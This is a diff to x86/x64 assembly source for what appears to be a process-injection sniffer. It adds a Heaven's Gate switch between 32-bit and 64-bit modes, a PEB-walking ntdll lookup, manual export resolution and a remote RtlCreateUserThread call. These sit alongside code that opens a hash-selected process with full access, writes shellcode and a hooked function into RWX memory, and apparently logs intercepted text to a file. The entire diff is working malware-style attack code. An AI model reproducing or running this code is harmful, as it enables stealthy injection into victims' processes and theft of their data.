@@ -7,6 +7,385 @@ reloc_base:
 
 jmp main
 
+[bits 64]
+; arg0: str             rcx
+;
+; ret: num chars        rax
+strlen_hg:
+        push rbp
+        mov rbp, rsp
+
+        mov [rbp + 16], rcx                 ; str
+
+        ; rbp - 8 = output strlen
+        ; rbp - 16 = rsi
+        sub rsp, 16                         ; allocate local variable space
+    
+        mov qword [rbp - 8], 0              ; strlen = 0
+        mov [rbp - 16], rsi                 ; save rsi
+
+        mov rsi, [rbp + 16]                 ; str
+
+        jmp .while_condition
+        .loop:
+            inc qword [rbp - 8]             ; ++strlen
+
+            .while_condition:
+                lodsb                       ; load from mem to al
+
+                cmp al, 0                   ; end of string ?
+                jne .loop
+    
+        mov rsi, [rbp - 16]                 ; restore rsi 
+        mov rax, [rbp - 8]                  ; strlen in rax
+
+        leave
+        ret
+
+; arg0: str             rcx
+; arg1: wstr            rdx
+;
+; ret: 1 if equal       rax
+strcmpiAW_hg:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx             ; str
+    mov [rbp + 24], rdx             ; wstr
+
+    ; rbp - 8 = return value
+    ; rbp - 16 = rsi
+    ; rbp - 24 = rdi
+    ; rbp - 32 = 8 bytes padding
+    sub rsp, 32                     ; allocate local variable space
+
+    mov qword [rbp - 8], 0          ; return value
+    mov [rbp - 16], rsi             ; save rsi
+    mov [rbp - 24], rdi             ; save rdi
+
+    mov rsi, [rbp + 16]             ; str
+    mov rdi, [rbp + 24]             ; wstr
+
+.loop:
+    movzx eax, byte [rsi]
+    movzx edx, byte [rdi]
+
+    cmp al, dl
+
+    jg .al_more_than_dl
+    jl .al_less_than_dl
+
+.continue_loop:
+    cmp al, 0                       ; end of string ?
+    je .loop_end_equal
+
+    inc rsi
+    add rdi, 2
+
+    jmp .loop
+
+    .al_more_than_dl:
+        add dl, 32
+        cmp al, dl
+
+        jne .loop_end_not_equal
+        jmp .continue_loop
+
+    .al_less_than_dl:
+        add al, 32
+        cmp al, dl
+
+        jne .loop_end_not_equal
+        jmp .continue_loop
+
+.loop_end_not_equal:
+    mov qword [rbp - 8], 0          ; return value
+    jmp .shutdown
+
+.loop_end_equal:
+    mov qword [rbp - 8], 1          ; return value
+    jmp .shutdown
+
+.shutdown:
+    mov rdi, [rbp - 24]             ; restore rdi
+    mov rsi, [rbp - 16]             ; restore rsi
+    mov rax, [rbp - 8]              ; return value
+
+    leave
+    ret
+
+; arg0: str                     rcx
+; arg1: wstr                    rdx
+;
+; ret: 1 if equal               rax
+strcmpiAA_hg:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx             ; str
+    mov [rbp + 24], rdx             ; wstr
+
+    ; rbp - 8 = return value
+    ; rbp - 16 = rsi
+    ; rbp - 24 = rdi
+    ; rbp - 32 = 8 bytes padding
+    sub rsp, 32                     ; allocate local variable space
+
+    mov qword [rbp - 8], 0          ; return value
+    mov [rbp - 16], rsi             ; save rsi
+    mov [rbp - 24], rdi             ; save rdi
+
+    mov rsi, [rbp + 16]             ; str
+    mov rdi, [rbp + 24]             ; wstr
+
+.loop:
+    movzx eax, byte [rsi]
+    movzx edx, byte [rdi]
+
+    cmp al, dl
+    jg .al_more_than_dl
+    jl .al_less_than_dl
+
+.continue_loop:
+    cmp al, 0                       ; end of string ?
+    je .loop_end_equal
+
+    inc rsi
+    inc rdi
+
+    jnz .loop
+
+    .al_more_than_dl:
+        add dl, 32
+        cmp al, dl
+
+        jne .loop_end_not_equal
+        jmp .continue_loop
+
+    .al_less_than_dl:
+        add al, 32
+        cmp al, dl
+
+        jne .loop_end_not_equal
+        jmp .continue_loop
+
+.loop_end_not_equal:
+    mov qword [rbp - 8], 0          ; return value
+    jmp .shutdown
+
+.loop_end_equal:
+    mov qword [rbp - 8], 1          ; return value
+    jmp .shutdown
+
+.shutdown:
+    mov rdi, [rbp - 24]             ; restore rdi
+    mov rsi, [rbp - 16]             ; restore rsi
+    mov rax, [rbp - 8]              ; return value
+
+    leave
+    ret
+
+; arg0: base addr           rcx
+; arg1: proc name           rdx
+;
+; return: proc addr         rax
+get_proc_address_by_name_hg:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx                     ; base addr
+    mov [rbp + 24], rdx                     ; proc name
+
+    ; rbp - 8 = return value
+    ; rbp - 16 = nt headers
+    ; rbp - 24 = export data directory
+    ; rbp - 32 = export directory
+    ; rbp - 40 = address of functions
+    ; rbp - 48 = address of names
+    ; rbp - 56 = address of name ordinals
+    ; rbp - 312 = forwarded dll.function name - 256 bytes
+    ; rbp - 320 = function name
+    ; rbp - 328 = loaded forwarded library addr
+    ; rbp - 336 = function name strlen
+    ; rbp - 344 = rbx
+    ; rbp - 472 = dll name with extension -> not used, dll name used as is without .dll ext
+    ; ebp - 480 = 8 bytes padding
+    sub rsp, 480                            ; allocate local variable space
+    sub rsp, 32                             ; allocate shadow space
+
+    mov qword [rbp - 8], 0                  ; return value
+    mov [rbp - 344], rbx                    ; save rbx
+
+    mov rbx, [rbp + 16]                     ; base addr
+    add rbx, 0x3c                           ; *e_lfa_new
+
+    movzx ecx, word [rbx]                   ; e_lfanew
+
+    mov rax, [rbp + 16]                     ; base addr
+    add rax, rcx                            ; nt header
+
+    mov [rbp - 16], rax                     ; nt header
+
+    add rax, 24                             ; optional header
+    add rax, 112                            ; export data directory
+
+    mov [rbp - 24], rax                     ; export data directory
+
+    mov rax, [rbp + 16]                     ; base addr
+    mov rcx, [rbp - 24]                     ; export data directory
+    mov ebx, [rcx]
+    add rax, rbx                            ; export directory
+
+    mov [rbp - 32], rax                     ; export directory
+
+    add rax, 28                             ; address of functions rva
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of function rva
+
+    mov [rbp - 40], rax                     ; address of functions
+
+    mov rax, [rbp - 32]                     ; export directory
+    add rax, 32                             ; address of names rva
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of names rva
+
+    mov [rbp - 48], rax                     ; address of names
+
+    mov rax, [rbp - 32]                     ; export directory
+    add rax, 36                             ; address of name ordinals
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of name ordinals
+
+    mov [rbp - 56], rax                     ; address of name ordinals
+
+    mov r10, [rbp - 32]                     ; export directory
+    add r10, 24                             ; number of names
+    mov r10d, [r10]                         ; number of names in r10
+
+    xor r11, r11
+.loop_func_names:
+    ; to index into an array, we multiply the size of each element with the 
+    ; current index and add it to the base addr of the array
+    mov dword eax, 4                        ; size of dword
+    mul r11                                 ; size * index
+    mov rbx, [rbp - 48]                     ; address of names
+    add rbx, rax                            ; address of names + n
+    mov ebx, [rbx]                          ; address of names [n]
+
+    add rbx, [rbp +  16]                    ; base addr + address of names [n]
+
+    mov rcx, [rbp + 24]                     ; proc name
+    mov rdx, rbx
+    call strcmpiAA_hg
+
+    cmp rax, 1                              ; are strings equal
+    je .function_found
+
+    inc r11
+    cmp r11, r10
+    jne .loop_func_names
+
+    jmp .shutdown
+
+.function_found:
+    mov rax, 2                              ; size of ordinal value
+    mul r11                                 ; index * size of element of addrees of name ordinals(word)
+    add rax, [rbp - 56]                     ; address of name ordinals + n
+    movzx eax, word [rax]                   ; address of name ordinals [n]; index into address of functions
+
+    mov rbx, 4                              ; size of element of address of functions(dword)
+    mul rbx                                 ; index * size of element
+    add rax, [rbp - 40]                     ; address of functions + index
+    mov eax, dword [rax]                    ; address of functions [index]
+
+    add rax, [rbp + 16]                     ; base addr + address of functions [index]
+
+    mov [rbp - 8], rax                      ; return value
+
+.shutdown:
+    mov rbx, [rbp - 344]                    ; restore rbx
+    mov rax, [rbp - 8]                      ; return value
+
+    leave
+    ret
+
+; ret: ntdll handle     rax
+get_ntdll_module_handle_hg:
+        push rbp
+        mov rbp, rsp
+    
+        ; rbp - 8 = First List Entry
+        ; rbp - 16 = Current List Entry
+        ; rbp - 24 = Table Entry
+        ; rbp - 32 = return addr
+        ; rbp - 56 = ntdll string
+        ; rbp - 64 = padding bytes
+        sub rsp, 64                         ; allocate local variable space
+        sub rsp, 32                         ; allocate shadow space
+    
+        mov rax, 'ntdll.dl'
+        mov [rbp - 56], rax
+        mov rax, 'l'
+        mov [rbp - 48], rax
+    
+        mov rax, gs:[0x60]                  ; peb
+        add rax, 0x18                       ; *ldr
+        mov rax, [rax]                      ; ldr
+        add rax, 0x20                       ; InMemoryOrderModuleList
+    
+        mov [rbp - 8], rax                  ; *FirstModule
+        mov rax, [rax]
+        mov [rbp - 16], rax                 ; CurrentModule
+        mov qword [rbp - 32], 0             ; return code
+    
+    .loop:
+        cmp rax, [rbp - 8]                  ; CurrentModule == FirstModule ?
+        je .loop_end_equal
+            sub rax, 16                     ; *TableEntry
+            mov [rbp - 24], rax             ; *TableEntry
+    
+            add rax, 0x58                   ; *BaseDLLName
+            add rax, 0x8                    ; BaseDLLName.Buffer
+    
+            mov rcx, rbp
+            sub rcx, 56                     ; ntdll string
+            mov rdx, [rax]
+            call strcmpiAW_hg
+    
+            cmp rax, 1                      ; strings match
+            je .module_found
+    
+            mov rax, [rbp - 16]             ; CurrentModule
+            mov rax, [rax]                  ; CurrentModule = CurrentModule->Flink
+            mov [rbp - 16], rax             ; CurrentModule
+    
+            jmp .loop
+    
+    .module_found:
+        mov rax, [rbp - 24]                 ; *TableEntry
+        add rax, 0x30                       ; TableEntry->DllBase
+        mov rax, [rax]
+        mov [rbp - 32], rax
+    
+        jmp .shutdown
+    
+    .loop_end_equal:
+    
+    .shutdown:
+        mov rax, [rbp - 32]                 ; return code
+    
+        leave
+        ret
+
+[bits 32]
+go_to_64_bit:
+    retf
+
+[bits 64]
+go_to_32_bit:
+    retfq
+
+[bits 32]
 ; arg0: str                 [ebp + 8]
 ;
 ; ret: num chars            eax
@@ -243,10 +622,10 @@ utils_find_target_pid_by_hash:
 
     .loop:
         mov eax, ebp
-        sub eax, 304
+        sub eax, 304                ; &processEntry
         push eax
         push dword [ebp - 8]        ; snapshot handle
-        call [esi + data + 12]       ; process32Next
+        call [esi + data + 12]      ; process32Next
 
         cmp eax, 0
         je .loop_end
@@ -264,8 +643,8 @@ utils_find_target_pid_by_hash:
 
     .process_found:
         mov eax, ebp
-        sub eax, 304
-        add eax, 8
+        sub eax, 304                ; &processEntry
+        add eax, 8                  ; processEntry.th32ProcessID
 
         mov eax, [eax]
         mov [ebp - 4], eax
@@ -562,6 +941,16 @@ populate_func_addrs:
 
         mov [esi + data + 36], eax              ; VirtualFreeEx addr
 
+        ; Sleep
+        push 0x128d1                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 40], eax              ; Sleep addr
+
     .shutdown:
         leave
         ret
@@ -570,12 +959,18 @@ main:
         push ebp
         mov ebp, esp
 
-        ; ebp - 4 = return value
-        ; ebp - 8 = target pid
-        ; ebp - 12 = target hnd
-        ; ebp - 16 = sniff mem
-        ; ebp - 20 = sniff hooked func mem
-        sub esp, 20                         ; local variable space
+        ; ebp - 8  = return value
+        ; ebp - 16 = target pid
+        ; ebp - 24 = target hnd
+        ; ebp - 32 = sniff mem
+        ; ebp - 40 = sniff hooked func mem
+        ; ebp - 64 = RtlCreateUserThread str
+        ; ebp - 72 = RtlCreateUserThread addr
+        ; ebp - 80 = ntdll addr
+        ; ebp - 88 = out ptr for thread id
+        ; ebp - 96 = padding bytes
+        sub esp, 96                         ; local variable space
+        sub esp, 80                         ; shadow space
 
         call utils_get_kernel_module_handle
 
@@ -594,10 +989,10 @@ main:
         cmp eax, 0
         je .shutdown
 
-        mov [ebp - 8], eax                  ; target pid
+        mov [ebp - 16], eax                 ; target pid
 
         ; open hnd to target proc
-        push dword [ebp - 8]                ; target pid
+        push dword [ebp - 16]               ; target pid
         push dword 0
         push dword 0x1fFFFF                 ; PROCESS_ALL_ACCESS
         call [esi + data + 20]              ; openProcess
@@ -605,53 +1000,22 @@ main:
         cmp eax, 0
         je .shutdown
 
-        mov [ebp - 12], eax                 ; target hnd
+        mov [ebp - 24], eax                 ; target hnd
 
         ; alloc mem for sniff and data
         push dword 0x40                     ; PAGE_EXECUTE_READWRITE
         push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
         mov ecx, sniff_x64.len
-        add ecx, [esi + data + 40]          ; sniff data size
+        add ecx, [esi + data + 44]          ; sniff data size
         push ecx
         push dword 0
-        push dword [ebp - 12]               ; target hnd
+        push dword [ebp - 24]               ; target hnd
         call [esi + data + 24]              ; virtualAllocEx
 
         cmp eax, 0
         je .shutdown
 
-        mov [ebp - 16], eax                 ; sniff mem
-
-        ; write sniff
-        push dword 0
-        push sniff_x64.len
-        mov eax, esi
-        add eax, sniff_x64
-        push eax
-        push dword [ebp - 16]               ; sniff mem
-        push dword [ebp - 12]               ; target hnd
-        call [esi + data + 28]              ; writeProcessMemory
-
-        cmp eax, 0
-        je .shutdown
-
-        ; write sniff data
-        push dword 0
-        push dword [esi + data + 40]        ; sniff data size
-        mov edx, esi
-        add edx, data
-        add edx, 44                         ; sniff data esi + data + 44
-        push edx                            ; sniff data
-        mov ecx, [ebp - 16]                 ; sniff mem
-        add ecx, sniff_x64.len
-        push ecx
-        push dword [ebp - 12]               ; target hnd
-        call [esi + data + 28]              ; writeProcessMemory
-
-        cmp eax, 0
-        je .shutdown
-
-    int3
+        mov [ebp - 32], eax                 ; sniff mem
         ; alloc mem sniff hooked func and data
         push dword 0x40                     ; PAGE_EXECUTE_READWRITE
         push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
@@ -659,14 +1023,44 @@ main:
         add ecx, 292                        ; sniff hooked func data size
         push ecx
         push dword 0
-        push dword [ebp - 12]               ; target hnd
+        push dword [ebp - 24]               ; target hnd
         call [esi + data + 24]              ; virtualAllocEx
 
         cmp eax, 0
         je .shutdown
 
-        mov [ebp - 20], eax                 ; sniff hooked func mem
-        mov [esi + data + 84], eax          ; hooked mem addr
+        mov [ebp - 40], eax                 ; sniff hooked func mem
+        mov [esi + data + 88], eax          ; hooked mem addr
+        mov dword [esi + data + 92], 0      ; zero out the higher dword
+
+        ; write sniff
+        push dword 0
+        push sniff_x64.len
+        mov eax, esi
+        add eax, sniff_x64
+        push eax
+        push dword [ebp - 32]               ; sniff mem
+        push dword [ebp - 24]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
+
+        ; write sniff data
+        push dword 0
+        push dword [esi + data + 44]        ; sniff data size
+        mov edx, esi
+        add edx, data
+        add edx, 48                         ; sniff data esi + data + 48
+        push edx                            ; sniff data
+        mov ecx, [ebp - 32]                 ; sniff mem
+        add ecx, sniff_x64.len
+        push ecx
+        push dword [ebp - 24]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
 
         ; write sniff hooked func
         push dword 0
@@ -674,8 +1068,8 @@ main:
         mov ecx, esi
         add ecx, sniff_hooked_func_x64
         push ecx
-        push dword [ebp - 20]               ; sniff hooked func mem
-        push dword [ebp - 12]               ; target hnd
+        push dword [ebp - 40]               ; sniff hooked func mem
+        push dword [ebp - 24]               ; target hnd
         call [esi + data + 28]              ; writeProcessMemory
 
         cmp eax, 0
@@ -686,25 +1080,89 @@ main:
         push dword 292                      ; sniff hooked func data size
         mov edx, esi
         add edx, data
-        add edx, 92                         ; sniff hooked func data
+        add edx, 96                         ; sniff hooked func data
         push edx
-        mov eax, [ebp - 20]                 ; sniff hooked func mem
+        mov eax, [ebp - 40]                 ; sniff hooked func mem
         add eax, sniff_hooked_func_x64.len
         push eax
-        push dword [ebp - 12]               ; target hnd
+        push dword [ebp - 24]               ; target hnd
         call [esi + data + 28]              ; writeProcessMemory
 
         cmp eax, 0
         je .shutdown
 
+        ; jump to 64 bit
+        push dword 0x33
+        call go_to_64_bit
+
+    [bits 64]
+        ; get ntdll hnd
+        call get_ntdll_module_handle_hg
+
+        cmp rax, 0
+        je .shutdown_64_bit
+
+        mov [rbp - 80], rax                 ; ntdll addr
+
+        ; Create func str
+        mov rax, 'RtlCreat'
+        mov [rbp - 64], rax
+
+        mov rcx, 'eUserThr'
+        mov [rbp - 56], rcx
+
+        mov rdx, 'ead'
+        mov [rbp - 48], rdx
+        mov byte [rbp - 45], 0
+
+        ; get func addr
+        mov rcx, [rbp - 80]                 ; ntdll addr
+        mov rdx, rbp
+        sub rdx, 64                         ; RtlCreateUserThread str
+        call get_proc_address_by_name_hg
+
+        cmp rax, 0
+        je .shutdown_64_bit
+
+        mov [rbp - 72], rax                 ; RtCreateUserThread addr
+
+        ; call func
+        mov ecx, [rbp - 24]                 ; targt hnd
+        xor edx, edx
+        xor r8d, r8d
+        xor r9d, r9d
+        mov qword [rsp + 32], 0
+        mov qword [rsp + 40], 0
+        mov eax, [rbp - 32]                 ; sniff mem
+        mov [rsp + 48], rax
+        mov qword [rsp + 56], 0
+        mov rax, rbp
+        sub rax, 88                         ; out ptr to thread id
+        mov [rsp + 64], rax
+        mov qword [rsp + 72], 0
+        call [rbp - 72]                     ; RtlCreateUserThread
+
+    .shutdown_64_bit:
+        ; jump to 32 bit
+        push dword 0x23
+        call go_to_32_bit
+
+    [bits 32]
+        push dword [ebp - 88]               ; remote thread id
+        call [esi + data + 32]              ; resumeThread
+
     .shutdown:
+        ; wait 1 sec for remote thread create to finish
+        push 2000
+        call [esi + data + 40]              ; sleep
+
         push dword 0x8000                   ; MEM_RELEASE
         push dword 0
-        push dword [ebp - 16]               ; sniff mem
-        push dword [ebp - 12]               ; target hnd
+        push dword [ebp - 32]               ; sniff mem
+        push dword [ebp - 24]               ; target hnd
         call [esi + data + 36]              ; virtualFreeEx
         
-        push dword [ebp - 8]                ; target pid
+        push dword [ebp - 16]               ; target pid
         call [esi + data + 16]              ; closeHandle
 
         leave
@@ -726,19 +1184,21 @@ data:
 ; writeProcessMemory        28
 ; resumeThread              32
 ; virtualFreeEx             36
-; sniff data size           40
+; sleep                     40
+
+; sniff* data size           44
 
 ; sniff data
-; getModuleHandleA              44
-; loadLibraryA                  52
-; imageDirectoryEntryToDataEx   60
-; virtualProtect                68
-; funcAddrPage                  76
-; hookedFuncMem                 84
+; getModuleHandleA              48
+; loadLibraryA                  56
+; imageDirectoryEntryToDataEx   64
+; virtualProtect                72
+; funcAddrPage                  80
+; hookedFuncMem                 88
 
 ; sniff hooked func data
-; wideCharToMultiByte           92
-; createFile                    100
-; writeFile                     108
-; closeHandle                   116
-; filePath                      124
+; wideCharToMultiByte           96
+; createFile                    104
+; writeFile                     112
+; closeHandle                   120
+; filePath                      128
